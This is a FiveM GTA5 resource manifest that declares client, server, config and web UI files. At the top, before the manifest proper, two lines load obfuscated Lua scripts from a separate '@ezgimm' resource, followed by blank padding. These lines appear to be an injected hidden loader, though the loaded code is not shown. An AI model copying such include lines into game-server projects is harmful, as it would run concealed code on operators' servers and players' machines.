shared_script '@ezgimm/shared_fg-obfuscated.lua'
shared_script '@ezgimm/ai_module_fg-obfuscated.lua'

-- ERDEM & MUSTAFA
-- ERDEM & MUSTAFA




 
 

fx_version 'cerulean'

game "gta5"

author "ate-Script"
version '2.5.5'

lua54 'yes'

ui_page 'web/index.html'

shared_script {
  "config.lua",
  '@ox_lib/init.lua',
}

server_script {
  "server/**",
  '@oxmysql/lib/MySQL.lua',
}

client_script {
  'client/**',
}

files {
  'web/**',
  "node_modules/fivem-game-view/**/*",
}